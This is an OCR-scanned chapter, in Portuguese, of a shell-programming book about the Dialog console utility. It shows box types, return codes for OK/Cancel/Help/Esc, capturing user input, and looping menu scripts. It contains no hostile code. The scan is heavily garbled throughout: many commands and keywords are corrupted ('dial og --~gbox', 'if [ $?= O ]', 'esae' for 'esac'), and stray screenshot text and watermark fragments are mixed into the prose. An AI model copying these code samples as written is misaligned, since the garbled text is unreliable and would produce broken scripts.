Para um aprendizado robusto, recomenda-se que o leitor tenha um She/1 
disponível no momento da leitura. Nesse She/1 devem ser digitados e exe-
cutados todos os exemplos, para que o leitor tenha uma experiência prática 
com o Dialog, e não apenas faça uma leitura passiva. 
Últimas Palavras Antes de Iniciar 
Resumindo o Prefácio: para obter os conhecimentos que este documento 
se propõe a transmitir, o leitor deve ter: 
-
Conhecimento prévio de programação She/1; 
-
Um She/1 disponível para testar os exemplos; 
-
O Dialog instalado e funcionando em sua máquina. 
Se você ainda não tem o Dialog, instale o programa direto do CD da sua 
distribuição de Linux, ou baixe os fontes. 
Tudo certo? Então boa leitura I 
Introdução 
O que é o Dialog 
O Dialog é um programa para console (modo texto) que desenha caixas 
de diálogo ("dialog boxes") na tela, similares às do modo gráfico, com bo-
tões, entradas para texto e menu. Essas caixas são utilizadas para compor 
interfaces amigáveis com o usuário, para que ele responda perguntas ou 
escolha opções. 
O Dialog é um executável e recebe todos os parâmetros via linha 
de comando, então ele geralmente é usado dentro de um She// Script. 
Serve para fazer programas interativos, que o usuário precisa operar 
durante sua execução. Tarefas comuns feitas com o Dialog são escolher 
uma opção em um menu, escolher um arquivo, uma data e digitar frases 
ou senhas. 
Mate 
com d r~•tos autCYa s 
Dialog 
453 
Com o Dialog é possível fazer programas em She/1 que se "parecem" 
com programas gráficos, onde o usuário vê apenas telas e navega entre 
elas apertando os botões de "OK" e "CANCELAR". Um exemplo clássico 
desse tipo de interface são os programas de instalação de software. 
Utilizando esse conceito de telas, é possível "amarrar'' o usuário ao progra-
ma, lhe apresentando as opções disponíveis, sem que ele precise ter acesso 
direto à linha de comando. Útil para logins restritos e para ajudar iniciantes. 
Breve Histórico do Dialog 
O Dialog original é antigo e não é mais desenvolvido, foi até a versão 0.3. 
Outros programadores o adotaram e continuaram o desenvolvimento até 
a versão 0.7. Depois surgiu o "cdialog" (ComeOn Oialog), como um Dialog 
melhorado, baseado no original. 
O cdialog continuou evoluindo e acabou se tornando o oficial, sendo re-
nomeado para "dialog". Este é o Dialog que veremos aqui. 
Seu Primeiro Comando com o Dialog 
Vamos direto a um exemplo para que você conheça •a cara" do Dialog. 
Sente numa posição confortável e digite no She/1 o seguinte comando: 
$ dial og --~gbox 'mi nha primeira ~ela' 5 40 
Imediatamente sua tela ficará assim: 
Fácil, não? Desenhamos uma caixa de mensagens (msgbox) de tamanho 
5 por 40. 
Mate ria com d r bs a;.Jtora!S 
454 Programação Shell Unu~ 
O Dialog reconhece vários tipos de "caixas", e esta msgbox é uma das 
mais simples. os dois números passados no final do comando definem o ta-
manho da caixa que queremos desenhar, nesse caso 5 linhas e 40 colunas 
(Não confundir com pixels, pois estamos no console!). 
Listagem dos 15 Tipos de Caixas 
Para saciar a curiosidade do leitor, aqui estão listados todos os tipos de 
caixas suportados pelo Dialog: 
I Tipo da caixa 
Desenha uma caixa onde o usuário •.. 
~~ 
calendar 
Vê um calendário e escolhe uma data 
checklíst 
Vê uma lista de opções e escolhe várias 
fselect 
Digita ou escolhe um arquivo 
:-=----
gauge 
Vê uma barra de progresso (porcentagem) 
infobox 
Vê uma mensagem, sem botões 
;= 
ínputbox 
Dígita um texto qualquer 
I 
menu 
Vê um menu e escolhe um item 
msgbox 
Vê uma mensagem e aperta o botão OK 
passwordbox 
Digita uma senha 
radiollst 
Vê uma lista de opções e escolhe uma 
r-
tailbox 
Vê a saída do comando tail - f 
:::-
tailboxbg 
Vê saída do comando tai 1 - f (segundo plano) 
textbox 
Vê o conteúdo de um arquivo 
~ 
timebox 
Escolhe um horário 
yesno 
Vê uma pergunta e aperta o botão YES ou o NO 
É notável que a variedade é grande e temos caixas para vários tipos de 
tarefas. Algumas caixas são novas e foram introduzidas em versões mais 
recentes do Dialog. 
Dialog 
455 
Caso alguma dessas caixas não funcione na sua máquina, atualize o 
seu Dialog para a versão mais recente ou confira se ele foi compilado com 
todas as caixas disponíveis. 
Exemplos dos Tipos de Caixa 
Agora que já sabemos como é a cara do Dialog, e quais são todos os tipos 
de caixas disponíveis, com certeza o leitor deve estar afoito para cruzar 
essas duas informações e ver a cara de todas as caixas, não? 
É isso o que veremos agora, uma listagem completa com um exemplo 
funcional de cada tipo de caixa, constando um foto da tela e a linha de co-
mando usada para gerá-la. 
Como uma maneira de contextualizar nossa listagem, inventamos o IIV, 
que é o lnstalador Imaginário do Vi. As telas seguintes fazem parte desse 
instalador, que instala e configura o editor de textos Vi em sua máquina. 
Instruções Importantes: 
-
Não veja essa lista com pressa. 
-
Analise com atenção os detalhes de cada tela, acompanhe na linha 
de comando as opções e parâmetros utilizados, redigite (ou copie e 
cole) os comandos na sua She/1 e veja os exemplos "ao vivo". 
-
Experimente mudar alguns parâmetros e ver o que acontece, explore 
as possibilidades. 
-
Não se preocupe agora em "como" o Dialog funciona, mas sim com 
"o que" ele faz. 
-
Descubra-o, experimente-o, é de graça! 
-
Faça desse momento uma apresentação, imersão e aprendizado, 
para entrar no mundo do Dialog. 
Releia e siga as instruções acima! Ao final dessa viagem, se 
você seguir as instruções, com certeza você terá uma boa 
ideia dos poderes do Dialog, do quanto ele pode lhe ser útil 
e de onde você poderá aplicá-lo. 
456 Programação Shell Linux 
Não se assuste se de repente você ficar cheio de ideias e tiver von-
tade de fazer uns 5 programas diferentes agora mesmo, isso é normal! 
: l . O Dialog tem esse poder de sedução por sua simplicidade e flexibi-
lidade. 
Obs.: A quebra dos comandos em várias linhas é apenas estéti-
ca, não obrigatória. 
Calendar 
dialog \ 
- title 'Escolha a data' \ 
- calendar " \ 
o o\ 
31 12 1999 
Fselect 
diatog \ 
-title 'Escolha onde instalar'\ 
- fselect /usr/share/vim/ \ 
00 
[tusr/shoro/vlto/1 
M 
m 
nu:! 
ltt§Ptit ; ,; h .li . 
coop I eta 
I nota lo Wdo 
cu::rt.c.iZc'ltb Você escolhe 
Dialog 
457 
Gauge 
dialog I 
--title 'Instalação dos Pacotes' I 
--gauge '\nlnstalando Vim-6.0a.tgz ... ' I 
8 40 60 
lnfobox 
dialog \ 
--title 'Aguarde' I 
--infobox 
'\nFinalizando 
em 
5 
I 
segundos .. .' I 
00 
lnputbox, Passwordbox 
dialog \ 
--title 'Confirmação' \ 
--passwordbox 'Por favor, confirme a \ 
senha:'\ 
00 
Menu 
dialog 1 
- title 'Perfil'\ 
--menu 'Escolha o perfil da instalação:' I 
O O O I 
mlnima 'Instala o mfnimo'\ 
completa 'Instala tudo' I 
customizada Você escolhe' 
M I 
cvrn r to 
to 
s 
458 Programação Shelllinux 
[fJJ ilil46 iiH 
O e)l!leri~ 
() goru 
+) 
!fiNE H 
MiS de 1 ano 
MiS de 3 anos 
Jun 21 17:29:22 
xfs: xfa st.rtl4> 
Jun 21 17:29:23 libelula xfs: lllrnt~: lhe 
Jun 21 17:29:23 libelula xfs: 
Ent 
Jun 21 17:29:26 libelula 1'1111..1'04>[798): {I 
Jun 2117:32:28 libelula 1'1111..1'04>[797): {I 
Jun 2117:32:58 llbelula 1'1111..1'04>17991: ou 
Jun 2117:32:59 llbelula login[799): FAilE 
Jun 21 17:33:04 llbelula login(799]: FAilE 
Jun 21 17:33:06 llbelula F1111..PVCi>[799): {I 
Jun 21 19:39:22 l!belulo su(po~Luntxll1511 
Jun 21 19:<16:03 l!belulo su(po~Lunlx)[1511 
Jun 21 19:<16:21 l!belulo su(po~Luntx)[1562 
I 
Msgbox 
dialog \ 
-title 'Parabéns' \ 
--msgbox 'Instalação finalizada com \ 
sucesso.'\ 
640 
Radiolist 
dialog \ 
--title 'Pergunta' \ 
--radiolist 'Há quanto tempo você usa \ 
o Vi?'\ 
o o 0 \ 
iniciante 'até 1 ano' on \ 
experiente 'mais de 1 ano' off \ 
guru 'mais de 3 anos' off 
Tailbox, Tailboxbg 
tail -f lvar/log/messages > out & \ 
dialog \ 
--title 'Monitorando Mensagens do\ Sis-
tema' \ 
--tailbox out \ 
00 
: Vln support fllo t<> t>~ltch on lo.odl~ In 
• Maintainer: 
Bra~t Hootenaar- <BralliNiM,org 
• Last Ch""90: 2001 5tp 12 
lf exists("dld.tndent. oo•) 
flnlsh 
endlf 
let dld.lndent.on = 1 
....,._ fi lot~P>•ndent 
"'Fllollf>O • lf oxpond("(.,..tch>") I= • 
"'VV"P EllD 
Textbox 
dialog \ 
- title Visualizando Arquivo'\ 
- textbox 
/usr/share/vimlvim60/Jndent.vim \ 
0 0 
Timebox 
dialog \ 
--title 'Ajuste o Relógio'\ 
Dialog 
459 
-timebox '\nDICA: Use as setas e o \ 
TAS.'\ 
o o\ 
23 59 30 
Yesno 
dialog \ 
--title 'AVISO' \ 
--yesno '\nO Vi foi instalado e \ 
configurado. \ 
Você quer executá-lo agora?\n\n' \ 
00 
Agora que você já ficou horas copiando e colando os exemplos, ou redigitando os 
comandos, já está apto a conhecer o http://www.aurelio.net/Shell/dialog/dialog-tour.sh, 
um scripl pronto para ser executado que mostra todas as caixas para você ' : > 
t\.tatNi3.! com d r bs a.Jtora.~s 
460 Programação Shell Linux 
Como o Dialog Funciona 
E então, já está cheio de ideias? 
Sim 
Ótimo! Então vamos continuar o aprendizado e conhecer os detalhes do 
Dialog para poder usá-lo em scripts. 
Não 
Você seguiu as instruções do tópico anterior? 
Sim 
Então invista mais um tempo no She/1, executando os exemplos, mo-
dificando-os, avaliando as possibilidades do Dialog. Veja as figuras, 
imagine onde você poderia utilizar aquelas telinhas, nos seus progra-
mas atuais, em programas novos que você poderia fazer ... Depois 
volte aqui e continuamos a leitura. 
Não 
É uma pena. Neste ponto do documento você já seria um conhe-
cedor do Dialog. Considere voltar ao tópico anterior e tentar de 
novo. 
O Dialog é relativamente simples de usar, mas como ele age um pouco 
"diferente• dos outros programas do sistema, pode assustar e parecer con-
fuso numa primeira tentativa 
Como agora você já sabe "o que" o Dialog pode fazer, adiante veremos 
em detalhes como construir e obter dados das caixas e aprenderemos al-
gumas características do Dialog, como: 
-
A linha de comando é longa, cheia de opções; 
-
Ele redimensiona o texto e a caixa automaticamente; 
Usa código de retomo para botões Sim/Não, Ok/Cancel; 
Usa a saída de erro (STDERR) para textos e itens escolhidos. 
Mate ria com d r bs a;.Jtora!S 
Dialog 
461 
Parâmetros Obrigatórios da Linha de Comando 
No Dialog, é obrigatório passar o texto e o tamanho da caixa, sempre. Com 
isso, a cada chamada do programa deve haver pelo menos 4 opções na 
linha de comando. 
O formato genérico de chamada é: 
dialog --tipo- da - caixa ' <texto> ' <altura> <largura> 
texto -
O texto é a palavra ou frase que aparece no inicio da caixa, 
logo após a primeira linha (borda superior). Passe uma string 
vazia · • caso não deseje texto. Caso o texto seja maior que 
o tamanho da janela, ele será ajustado automaticamente, 
quebrando a linha. Para colocar as quebras de linhas manu-
almente, insira o padrão · \n • (barra-ene) onde desejar as 
quebras. Exemplo: ' Primeira linha . \ nsegunda . • 
a l r.ura -
A altura é o número de linhas que serão utilizadas para de-
senhar a caixa, inclusive a primeira e a última que fazem as 
bordas superior e inferior. Se informado o número zero, o 
Dialog ajusta automaticamente a altura da caixa para caber 
o conteúdo. 
largllra -
A largura é o número de colunas que serão utilizadas para 
desenhar a caixa, inclusive a primeira e a última que fazem 
as bordas esquerda e direita. Se informado o número zero, 
o Dialog ajusta automaticamente a largura da caixa para 
caber o conteúdo. 
Na prática, é melhor deixar que o Dialog quebre o texto e ajuste o tama-
nho das caixas automaticamente. Então nos exemplos desse documento 
não haverá quebras de linha manuais (\nl e os tamanhos serão sempre 
especificados como "O O" (zero zero). 
Em caixas como o menu, onde também é preciso passar todos os itens 
pela linha de comando, há mais parâmetros obrigatórios além dos já cita-
dos. Eles serão abordados adiante, no momento oportuno. 
Mate 
com d r~•los autCYa s 
462 Programação Shell Unux 
Como reconhecer respostas SIM ou NÃO 
A forma mais básica de se comunicar com o usuário é fazendo perguntas 
que ele possa responder com Sim ou Não. É possível fazer um configura-
dor, ou até mesmo um programinha simples, com essas respostas. Já foi 
visto como fazer uma telinha desse tipo: 
$ dialog - -yesno 'sim ou não? ' O O 
Mas, e dentro de um script, como saber qual foi a resposta do usuário? 
Qual foi o botão que ele apertou? 
O Dialog utiliza o código de retorno ("Return Code") para informar qual 
foi o botão apertado. Como sabemos, o She/1 guarda esse código dentro 
da variável $? . 
Então, que tal descobrirmos a solução do problema testando? Execute o 
seguinte comando duas vezes, e note qual o código de retorno que apare-
ce quando se escolhe YES e quando se escolhe NO. 
$ dialog --yesno 'sim ou não? ' O O ; echo Retorno : $? 
Fácil! zero para Sim, um para Não. 
Se lembrarmos que todos os comandos UNIX/Linux retornam zero em 
sucesso e qualquer coisa diferente de zero (geralmente 1) quando ocorre 
algum erro, fica fácil memorizar. O zero é sempre positivo, beleza, sem 
erro, SIM. O um é problema, erro, NÃo . 
Memorizando: SIM=O, NÃO·~ 
Dialog 
463 
Agora que sabemos isso, fica fácil lidar com as respostas do usuário. 
Basta usar o H para testar o valor do S? . Um exemplo bem simples: 
dialog --yesno ' Quer ver as horas? ' O O 
if [ $?= O ]; then 
echo "Aqoril s&o : s { date ) " 
else 
ccho ' Ok, não vou most rar as horas . ' 
li 
Caso a mensagem do else não seja necessária, podemos usar o opera-
dor && (E ou ANO) e deixar o comando bem mais simples: 
d i aloq - - yesno ' Quer ver as horas? ' O O && ccho "Agora sAo: $ (dnte}" 
Usando o Dialog fica fácil definir variáveis de estado ("tlags") ou opções 
antes da execução de um programa! Por exemplo, um programa simples 
para listar arquivos do diretório atual: 
i ! /bin/sh 
§ lsj . sh --o sc r ipt do "ls joiado" 
j 
~ste script faz parte do http: //ilurelio.net/Shell/dia!o9 
fi. Zerando <'S opcões 
cor= ; ocultos= ; subdir= ; detalhes= 
# Obtt!.ndo as con!lgu raçõ~s q u e o usuário dese j a 
dialog --yesno ' Usar cores? ' O O && cor=' -·color=ye s' 
dialoç --yesno ' Mostrar arquivos ocultos? ' O O && ocultos=' - a' 
dlalog --yesno ' Incluir sub- diretórios?' O O && subdir• ' - R' 
d i alog --yesno ' Mostrar visão detalhada? ' O O && detalhes=' - !' 
8 Nostrando os a rqu~vos 
l s Scor Socultos $subdir $detal hes 
Para baixar este script: http://www.aurelio.neVShell/dialog/lsj.sh 
Mate 
com d r~1tos autCYa s 
464 Programação Shell Linux 
Como Obter o Texto Que o Usuário Digitou 
A caixa inputbox serve para pedir que o usuário digite algo. A sua prima 
é a passwordbox, que tem funcionamento idêntico, apenas não mostra na 
tela o que o usuário digita (útil para senhas). 
Por exemplo, se quisermos que o usuário digite seu nome. Primeiro 
construímos a telinha: 
d i alog --inpu t box 'Digite seu nome: ' O O 
Tudo bem, o usuário digita seu nome, aperta ox e poft! O nome é repeti-
do na tela e volta o prompt. Como guardar o que foi digitado numa variável, 
para usar depois? 
O funcionamento padrão do Dialog é: após o usuário digitar seu nome e 
apertar o OK, esse texto é mandado para a saída de erro (STDERR). Temos 
três maneiras de "pescar" esse texto: 
1. Redirecionar a saída de erros ( STDERR) para um arquivo e ler o 
conteúdo desse arquivo 
2. Redirecionar a saída de erros (STDERR) para a saída padrão 
(STDOU7). 
3. Usar a opção --stdout do Dialog 
Veremos então essas três táticas. A primeira consiste em redirecionar 
para um arquivo, e é com certeza a maneira mais incômoda por precisar 
de um arquivo temporário, mas também é mais portável e que funciona em 
qualquer She/1. Como todos sabemos como fazer um redirecionamento, 
vamos direto ao exemplo: 
d i alog --inputbox 'Digite seu nome: ' O O 2>/tmp/ nome.txt 
nome• $ ' cat. /tmp/nome .txt ) 
echo "O seu nome e : $nome" 
Mate ria com d r bs a;.Jtora!S 
Dialog 
465 
Digite seu nome: 
Aurélio t1arinho Jargas 
Guardamos na variável nome o conteúdo do arquivo temporário. 
A segunda maneira é mais limpa por não precisar criar o arquivo tempo-
rário. Basta utilizar o operador 2>&1 para redirecionar a saída de erro para 
a saída padrão. Com o texto desejado na saída padrão, podemos definir a 
variável nome diretamente: 
nome=$( dialog --inputbox ' Digite seu nome :' O O 2>&1) 
echo "O seu nome é : $nome" 
Mas acaba sendo incômodo ter de ficar redirecionando a saída de erro 
sempre, a cada chamada do Dialog. A terceira maneira de obter o texto leva 
isso em conta e usa uma opção do próprio programa para redirecionar o 
texto para a saída padrão, a --stdout : 
nome=$( dialog - -stdout --inputbox ' Digite seu nome:' O O ) 
echo "O seu nome é : Snome" 
Das três formas apresentadas, essa é a mais limpa. Assim, nos exem-
plos seguintes, a opção --stdout será sempre utilizada. 
Ah! A caixa inputbox também aceita um último parâmetro opcional que 
é o texto inicial já preenchido no campo. Exemplo: 
dialog --stdout --inputbox ' Digite seu nome : • O O "seu nome aqui " 
466 Programação Shell Unux 
Como Obter o Item Único Escolhido de um Menu ou 
Radiolist 
Já sabemos como fazer telas tipo Sim/Não. Mas e se precisarmos ampliar 
o leque de respostas possíveis do usuário, onde também poderíamos ter 
"Talvez• ou "Não sei" como respostas válidas? Ou ainda, se precisarmos 
que o usuário escolha um ítem de um menu para saber qual das opções 
ele quer executar? 
Nesse caso o Sim/Não é insuficiente, e precisamos usar a caixa do tipo 
Menu, onde podemos especificar vários ítens diferentes e o usuário escolhe 
um (e apenas um). Para começar, vamos fazer um exemplo bem bobo: 
user=$t dialoq --stdout --l'llenu 'Bobice:' O O O 1 um 2 dois 3 erês) 
echo Você e5co.Lheu o nUmero $user 
Bobice: 
[ 
1 .... 
I~ 
3 
~$ 
A primeira grande diferença a se notar é que a linha de comando do 
Dialog ficou gigante, cheia de parâmetros! Vamos destrinchá-la. 
Até o Bobice : nenhuma novidade. Mas seguido dele estão três zeros, 
onde geralmente só tinha dois! Não, isso não é erro de digitação , ) 
Os dois primeiros zeros continuam sendo a altura e largura da caixa, 
isso nunca muda. Já o terceiro zero é uma propriedade especial do menu, 
que indica quantos itens serão •visíveis" de uma vez na caixa. Veja a dife-
rença de trocar este zero por um: 
dialog --stdout. --menu • Bobice : ' O O 1 1 um 2 dois 3 t.rês 
Mâ!CIIal 
r 1 d r ~ 
iliS 
Dialog 
467 
Agora apenas um item é visível por vez, diminuindo o tamanho da caixa. 
Isso pode ser útil quando o Menu tem muitas opções, mas para que a cai-
xa fique num tamanho aceitável, mostra-se apenas parte delas por vez e 
deve-se fazer uma "rolagem" para ver o resto. 
Logo após essa definição do número de itens, colocamos enfileirados to-
dos os itens do menu, no formato <item> <descrição> . Em nosso exemplo 
são três itens numéricos. 
Este é o formato genérico da linha de comando da caixa Menu: 
dialog --menu '<texto> ' O O <nüm-itens> <iteml > <descl> ... <itemN> 
<descN> 
núm-itens -
O número máximo de itens do menu que serão mostrados 
na caixa. Os demais ficarão ocultos e podem ser acessados 
rolando a lista com as setas do teclado. Caso especificado 
como zero, o Dialog mostra todos os itens, ou ajusta auto-
maticamente o número ideal para que a caixa caiba na tela. 
item -
O item deve ser um nome único, diferente para cada item. 
O item é o texto retornado pelo Dialog ao script, quando o 
usuário escolhe uma opção. 
descrição -
A descrição é um texto explicativo que serve para detalhar 
do que se trata o item. A descrição pode ser omitida pas-
sando a string vazia 
Exemplo: 
dialog --menu 'texto' O O O iteml ' ' item2 '' item3 ' ' 
M 
m 
468 Programação Shell Linux 
Agora que sabemos compor esse monstro que é a linha de comando de 
um Menu, vamos fazer mais um exemplo, com nomes em vez de números 
nos itens do menu: 
cor=$( dialog --stdout --menu ' As cores : ' O O O amarelo 'a cor do sol ' 
verde 'a cor da qrama ' azul 'a cor do céu ' ) 
echo Você escolheu a cor Scor 
610"elo a et:Jr do sol 
ml 
§i •. lbi ;~E! 
aud 
a c::or do céu 
Não é tão dificil, hein? A dica para não se confundir é enxergar a linha de 
comando como várias pequenas partes, identificando e isolando cada uma 
delas (veja comentários à direita): 
dialog 
- - stdout 
--menu 'As cores :' 
o o o 
amarelo 'a cor do sol ' 
verde 'a cor da grama ' 
azul 'a cor do céu ' 
usao STOOUT 
texto do menu 
anuta, largura e núm. flens 
ffem 1 
ffem 2 
ffem 3 
É por isso que, geralmente, os comandos Dialog são colocados em várias li-
nhas, para fazer essa separação em partes e facilitar o entendimento. Para tal, 
basta "escapar'' o final de cada linha do comando (exceto a última) com uma 
barra ( \) . Veja como fica o exemplo anterior quebrado em várias linhas: 
cor=${ dialog \ 
--stdout \ 
--menu 'As cores :' \ 
o o o \ 
amarelo 'a cor do sol ' \ 
verde 'a cor da grama ' \ 
azul 'a cor do céu ' ) 
eclcc ·:ocê escolheu a cor Scor 
Dialog 
469 
Bem melhor, não? Adicionalmente, pode-se alinhar os escapes e os itens 
para facilitar ainda mais a leitura: 
cor•$ ( dialog 
\ 
--stdout 
\ 
--menu 'As cores :' 
\ 
o o o 
\ 
amarelo 'a cor do sol ' 
\ 
verde 
'a cor da grama ' \ 
azul 
'a cor do céu ' 
echo Você escolheu a cor Scor 
Esta será a notação utilizada nos exemplos, por ser a mais didática. 
Não coloque comentários ou espaços em branco após a barra de 
escape, ela deve ser o último caractere da linha. 
dialog - - stdout \ i Esse comando é inválido . Estes 
--yesno texto\ # comentários não podem estar aqui . 
O primo próximo do Menu é o Radiolist. A única diferença entre os dois é 
que no Radiolist é possível definir qual será o item que já iniciará seleciona-
do. Para isso, cada item é composto por três parâmetros: nome, descrição, 
status. O status deve ser oN ou OFF, para informar se o item está "ligado" 
(marcado) ou não. 
Como na Radíolist o usuário só pode escolher um único item, cuidado 
na hora de compor o comando, pois apenas um ítem pode ter o status ON, 
todos os outros devem ser OFF. Caso precise de uma lista de múltipla es-
colha, veja o Checklíst no tópico seguinte. 
Usando o exemplo anterior, podemos iniciar a caixa com a cor "verde" já 
selecionada: 
dialog --radiolist ' As cores :' O O O \ 
amarelo ' a cor do sol ' OFF 
\ 
verde 
' a cor da grama ' ON 
\ 
azul 
' a cor do céu ' OFF 
470 Programação Shell Linux 
~~ 
41 •. l i .& ... 11 
• cor O. 9"-
~ cor do céu 
( ) ozul 
v(+) 
Ah! A outra diferença do Radiolist para o Menu é que ele usa os parênte-
ses <X> para marcar o item. 
Como Obter os Itens Múltiplos Escolhidos de um 
Checklist 
A caixa Checklist é idêntica à Radiolist já vista, a única diferença é o usuá-
rio poder escolher mais de um item; é uma caixa de múltipla escolha. 
Primeiro, vamos fazer um menu com opções para o usuário escolher: 
estilos=$( dialog --stdout \ 
--checklist ' Você gosta de:' O O O \ 
rock 
ON 
\ 
samba 
01?1? \ 
metal 
ON 
\ 
jazz 
OI?F \ 
pop 
ON 
\ 
mpb 
01?1? ) 
echo "Você escolheu : Sestilos" 
~ ~ 
(X) oetal 
( l j azz 
(X) PClP 
( )opb 
v(•) 
Dialog 
471 
A sintaxe é a mesma da Radiolist, e compomos uma lista onde os itens 
não têm descrição (usando as aspas vazias · • ). A diferença agora é que 
temos mais de um item selecionado. 
Note que o Dialog retoma todos na mesma linha, com cada item escolhi-
do entre aspas duplas. Esse retorno em apenas uma linha requer conheci-
mento em sed, awk ou outro editor programável para se identificar e extrair 
corretamente os itens escolhidos. 
Como isso dificulta o uso do Dialog, ele possui uma opção de linha de 
comando chamada --separate-output, que em vez de retornar tudo em 
uma linha, retoma os itens selecionados um por linha, e sem as aspas. 
Dessa maneira, fica bem mais fácil varrer e descobrir os itens escolhidos 
com um loop de while : 
estilos• $( dialog - - stdout \ 
--separate-output \ 
--checklist 'Você gosta de : • O O O \ 
rock 
ON 
\ 
samba 
OFF \ 
metal 
ON 
\ 
jazz '. OFf \ 
pop 
ON 
\ 
mpb 
'. Off ) 
echo "$estilos" I while read LINHA 
do 
echo "--- $LINHA" 
done 
Ou usando substituição de processos (capítulo 8) para evitar o pipe 
< I l : 
while read LINHA 
do 
echo "- - - $LINHA" 
done < <( dialog --stdout \ 
--separate-output \ 
--checklist 'Você gosta de : • 
rock 
ON 
\ 
samba 
Off \ 
metal .. ON 
\ 
jazz 
Off \ 
pop 
'. ON 
\ 
mpb 
'. Ofl" ) 
o o o \ 
472 Programação Shell Linux 
ll3J m::l 
[ J ·-
[X) •etal 
[ J j i!IZZ 
[ X) pop 
[ J """ 
v(+) 
E se o Usuário Apertar o Botão CANCELAR? 
Você faz as te linhas, apronta os menus, deixa tudo certinho para funcionar 
redondo. Mas, no meio do programa, o usuário desiste de tudo e aperta o 
botão CANCELAR. Como detectar isso? 
Assim como acontece com os botões Yes/No, o Dialog usa os Códigos 
de Retorno para informar se o usuário pressionou o oK ou o CANCELAR . 
[ OK=O, CANCELAR=l l 
Então sempre após cada telinha do dialog, coloque o seguinte teste para 
saber se o CANCELAR foi apertado: 
$? - eq l ] && echo ' Botão C~NCEL~R apertado' 
Dependendo de como funciona seu programa, você pode fazer o aperto 
do CANCELAR retornar à tela anterior, ao menu principal, ou ainda ser mais 
drástico e abandonar o programa. Tudo depende do tipo de navegação que 
você quer usar. 
Além de apertar o botão cANCELAR, o usuário também pode apertar a tecla 
<Esc> do teclado. Veja o tópico seguinte. 
M 
m 
Dialog 
473 
E se o Usuário Apertar a Tecla ESC? 
Em qualquer tela do Dialog, apertar a tecla <ESC> gera o código de retorno 
255 e abandona a caixa. Então, além de tratar do botão oK (retorno zero) e 
do CANcElAR (retorno 1 ), também é preciso cuidar da tecla <Esc>. 
Dependendo do tipo de sua aplicação, a tecla <ESC> pode gerar o mes-
mo procedimento que apertar o botão CANCEL.:o.R geraria. Ou, ainda, você 
pode ter dois procedimentos diferentes, um para cada evento. Tudo depen-
de do tipo de navegação que seu programa utiliza, algumas sugestões: 
Navegação amarrada a um Menu !Principal: 
-
Se apertar cANCELAR no Menu !Principal, sai do programa 
-
Se apertar CANCELAR numa tela secundária, volta ao Menu Principal 
-
Se apertar <Esc> em qualquer tela, sai do programa 
Navegação tipo Ida e Volta: 
-
Se apertar CANCEIJ\R volta à tela anterior 
Se apertar <Esc> sai do programa 
Veja exemplos completos desses tipos de navegação e do tratamento 
dos eventos no tópico seguinte. 
Caso queira mapear o <Esc> para o mesmo funcionamento do cANCELAR, 
você pode fazer um teste mais genérico como, "se não for o oK": 
$? - 11e O ] 
& t. echo 'E-SC ou CJVJCSLAR ape.rt.t:do ' 
Claro, se estiver usando botão de HE LP, ele também será mapeado para 
o CANCEIJ\R, então cuidado. 
E se o Usuário Apertar o botão HELP? 
O botão de ajuda !HELPI foi adicionado no dialog-0.9b, para usá-lo basta 
adicionar a opção --he l p -button . O seu código de retorno quando aperta-
do é dois. Vamos lá, memorizando novamente: 
~~0, CANCELARul, HELPu2 1 
Mate ria com d r bs a;.Jtora!S 
474 Programação Shell Linux 
O teste primário para saber se ele foi apertado é: 
$? - eq 2 J && echo 
'Bot~o HELP 
ape~tado ' 
Para mostrar o texto de ajuda para o usuário, basta usar uma caixa Ms-
gbox se for curto, ou uma Textbox se for algo mais extenso. Depois é só 
voltar para a caixa anterior. 
Como Tratar Todos os Botões e Teclas de Uma Vez? 
case $? in 
0) echo 
1) echo 
2) echo 
255) echo 
" } echo 
esac 
O usuãri o a pert ou o bo~ão 
O usuãri o a pert ou o botão 
O usuário a pertou o botao 
O usuârio a per t ou a tecl a 
Retorno desconheci do; ; 
OK (ou o Yes ) 
CANCELAR (ou 
H!:LP '' 
ESC .. 
Mergulhando de Cabeça no Dialog 
Exemplo de Menu Amarrado (em Loop) 
~ ! /bin/bash 
I 2 Escrever ~ 
carta 
3 Jogar pac:iência 
.4 
Perder teo'flO 
O Sair 
.. 
o No) 
i t i a. s h -
o s c r i pt da t i a que p rec isa u sar o c omputad o r 
i Este s c r ipt faz parte do http: //aure l i o .ne t /shell/dialog 
I! 
i Exempl o de como Amarrar o ~cript num menu pri ncipal 
u~ando 
Mate ria com d r bs a;.Jtora!S 
i o 'whil e' . O ' case' é usado para ident:.ifica.r qual foi a ação 
i escolhida . Após cada açAo, ele sempr e retorna ao menu 
§ principal . S6 sai do script Ca$0 escolha a. última opçAo, 
i! 
aport~ CJ'\.NCE!.J\R ou ESC . 
~ 
f Ot.il para usar como login shel.l de pessoas inexperient-es ou 
~ fazer utilitérios de ações restritas e definidas . 
~ 
# FLUXOGRAHl\ 
# 
i 
ii 
;; 
;; 
j 
j 
~ 
~ 
INÍCIO 
+-----------+ 
+----------+ 
+------> 
menu 
1--Esc-----> 
sai do 
I principal 1--Cancel--> I programa I 
+-----Ok----+ 
+--> +----------+ 
+--<--1 2 3-4--+--Zoro--->---+ 
1- Loop que most.ra o menu principal 
·.vhil(! : ; do 
i Nostr<l o m~nu na tela, com c1s 
~'çtles dispon iv~is 
don «e 
resposta=$ (d ialog --stdout \ 
--title ' Men u da Tia ' \ 
--menu ' Oi Tia, e scolha o quê você q uer fa:r.er : ' \ 
o o o 
\ 
1 'Navegar na Int ernet' \ 
2 
'Escreve~: uma carta' 
\ 
3 'Joga t: paciência ' 
\ 
4 'Pe&de.r tempo' 
\ 
O 'Sair ' ) 
il lUa apertou CANC!\LAA ou ESC, ent.âo vamos sair ... 
[ S? -ne O J && break 
N De acordo com a opçclo escolhida, d i spara pr ogramas 
case '' $resposta" in 
esae 
1) /usr/bin/mozilla 
1 htt.p: //googl e.com. br ' .. 
2) /bin/mced i t /tmp/cart.a .txt. ;; 
3) /usr/qamcs/solitoirc ; ; 
4) /usr/XllR6/bin/xsnow ; /uS</X11 R6/bln/xcyes ; ; 
O) break i i 
i Nensagem Cinnl : ) 
echo ' Tchau Tia!' 
Baixar este script em http://www.aurelio.netlshell/dialog/tia.sh 
Dialog 
475 
Mate 
com d r~11os autCYa s 
476 Programação Shell Linux 
Exemplo de Telas Encadeadas (Navegação Sem Volta) 
# ! /bin/sh 
# encadeado. sh -
o script que chega até o final 
9 Este s c r ipt faz parte do http://attt:eli o . net/shell/dialog 
~ 
B Exempl o de como encadear tel a.,:, U3ando o ope.rado.r && (.lV-10) . 
!f Caso o usuário d esi.st a em. qualquer t e l a {ape.rtando CA.NCEL-\R 
H ou SSC} , o scr ipt. cze.c uta. o primei ro cor:umdo após n c ndcia 
~ dê && • 
~ 
